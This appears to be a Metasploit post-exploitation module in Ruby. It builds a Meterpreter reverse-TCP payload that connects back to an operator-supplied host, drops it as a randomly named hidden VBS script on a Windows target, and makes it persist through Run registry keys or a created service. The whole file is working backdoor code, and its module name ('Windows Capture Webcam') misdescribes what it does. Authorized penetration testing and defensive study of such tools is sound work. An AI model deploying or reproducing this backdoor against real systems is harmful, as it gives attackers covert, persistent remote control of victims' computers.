##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'
require 'msf/core/post/windows/services'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::File
  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::Services
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Windows Capture Webcam',
      'Description'   => %q{
          This Module will upload a vbs to a remote host and make a persistent backdoor.
      },
      'License'       => MSF_LICENSE,
      'Authors'       => ['Carlos Perez & ByteZealot'],
      'Platform'      => ['win']
    ))

    register_options(
      [
        OptString.new('LHOST', [true, 'The IP of the system running Metasploit']),
        OptInt.new('LPORT', [true, 'The port on which the system running Metasploit is listening for the connect back', 4444]),
        OptInt.new('DELAY', [true, 'The interval in seconds between each connection attempt', 5]),
        OptString.new('LOCATION', [true, 'Location in target host to write payload to, if none \%TEMP\% will be used.', 'C:\Windows\Temp']),
        OptString.new('PAYLOAD', [true, 'Payload to use, default is windows/meterpreter/reverse_tcp', 'windows/meterpreter/reverse_tcp']),
        OptString.new('STARTUP', [true, 'When to start the agent: boot, user or service (with SYSTEM privileges)', 'user'])
      ], self.class)
  end

  # Function for Creating the Payload
  #-------------------------------------------------------------------------------
  def create_payload(payload_type,lhost,lport)
    print_status("Creating Payload=#{payload_type} LHOST=#{lhost} LPORT=#{lport}")
    payload = payload_type
    pay = client.framework.payloads.create(payload)
    pay.datastore['LHOST'] = lhost
    pay.datastore['LPORT'] = lport
    return pay.generate
  end

  # Function for Creating persistent script
  #-------------------------------------------------------------------------------
  def create_script(delay,altexe,raw,is_x64)
    if is_x64
      if altexe
        vbs = ::Msf::Util::EXE.to_win64pe_vbs(client.framework, raw,
                                               {:persist => true, :delay => delay, :template => altexe})
      else
        vbs = ::Msf::Util::EXE.to_win64pe_vbs(client.framework, raw,
                                               {:persist => true, :delay => delay})
      end
    else
      if altexe
        vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw,
                                               {:persist => true, :delay => delay, :template => altexe})
      else
        vbs = ::Msf::Util::EXE.to_win32pe_vbs(client.framework, raw,
                                               {:persist => true, :delay => delay})
      end
    end
    print_status("Persistent agent script is #{vbs.length} bytes long")
    return vbs
  end

  # Function for creating log folder and returning log path
  #-------------------------------------------------------------------------------
  def log_file(log_path = nil)
    #Get hostname
    host = client.sys.config.sysinfo["Computer"]

    # Create Filename info to be appended to downloaded files
    filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")

    # Create a directory for the logs
    if log_path
      logs = ::File.join(log_path, 'logs', 'persistence',
                       Rex::FileUtils.clean_path(host + filenameinfo) )
    else
      logs = ::File.join(Msf::Config.log_directory, 'persistence',
                       Rex::FileUtils.clean_path(host + filenameinfo) )
    end

    # Create the log directory
    ::FileUtils.mkdir_p(logs)

    #logfile name
    logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
    return logfile
  end

  # Function for writing script to target host
  #-------------------------------------------------------------------------------
  def write_script_to_target(target_dir,vbs)
    if target_dir
      tempdir = target_dir
    else
      tempdir = client.fs.file.expand_path("%TEMP%")
    end
    tempvbs = tempdir + "\\" + Rex::Text.rand_text_alpha((rand(8)+6)) + ".vbs"
    fd = client.fs.file.new(tempvbs, "wb")
    fd.write(vbs)
    fd.close
    print_good("Persistent Script written to #{tempvbs}")
    # Escape windows pathname separators.
    file_local_write(@clean_up_rc, "rm #{tempvbs.gsub(/\\/, '//')}\n")
    return tempvbs
  end

  # Function to execute script on target and return the PID of the process
  #-------------------------------------------------------------------------------
  def targets_exec(script_on_target)
    print_status("Executing script #{script_on_target}")
    proc = session.sys.process.execute("cscript \"#{script_on_target}\"", nil, {'Hidden' => true})
    print_good("Agent executed with PID #{proc.pid}")
    return proc.pid
  end

  # Function to install payload in to the registry HKLM or HKCU
  #-------------------------------------------------------------------------------
  def write_to_reg(key,script_on_target)
    nam = Rex::Text.rand_text_alpha(rand(8)+8)
    key_path = "#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    print_status("Installing into autorun as #{key_path}\\#{nam}")
    if key
      registry_setvaldata("#{key_path}", nam, script_on_target, "REG_SZ")
      print_good("Installed into autorun as #{key_path}\\#{nam}")
      file_local_write(@clean_up_rc, "reg deleteval -k '#{key_path}' -v #{nam}\n")
    else
      print_error("Error: failed to open the registry key for writing")
    end
  end

  # Function to install payload as a service
  #-------------------------------------------------------------------------------
  def install_as_service(script_on_target)
    if not is_uac_enabled? or is_admin?
      print_status("Installing as service..")
      nam = Rex::Text.rand_text_alpha(rand(8)+8)
      print_status("Creating service #{nam}")
      service_create(nam, nam, "cscript \"#{script_on_target}\"")
      file_local_write(@clean_up_rc, "execute -H -f sc -a \"delete #{nam}\"\n")
    else
      print_error("Insufficient privileges to create service")
    end
  end


  def run
    if client.nil?
      print_error("Invalid session ID selected. Make sure the host isn't dead.")
      return
    end

    # Default parameters for payload
    delay = 5
    install = false
    serv = false
    altexe = nil
    target_dir = nil
    script = nil
    script_on_target = nil

    key = "HKLM"

    payload_type = datastore['PAYLOAD']
    lhost = datastore['LHOST']
    lport = datastore['LPORT']
    delay = datastore['DELAY']
    target_dir = datastore['LOCATION']

    startup = datastore['STARTUP']
    if startup == 'boot'
      install = true
      key = "HKLM"
    elsif startup == 'service'
      serv = true
    else
      install = true
      key = "HKCU"
    end

    print_status("Running Persistence Script")
    # Create undo script
    @clean_up_rc = log_file()
    print_status("Resource file for cleanup created at #{@clean_up_rc}")
    # Create and Upload Payload
    raw = create_payload(payload_type, lhost, lport)
    script = create_script(delay, altexe, raw, payload_type.include?('x64'))
    script_on_target = write_script_to_target(target_dir, script)

    # Execute on target host
    targets_exec(script_on_target)
 
    # Install in registry
    if install ==  true
      write_to_reg(key,script_on_target)
    end

    # Install as a service
    if serv == true
      install_as_service(script_on_target)
    end
  end

end

# thx to Carlos Perez for laying the ground for this post exploit module.

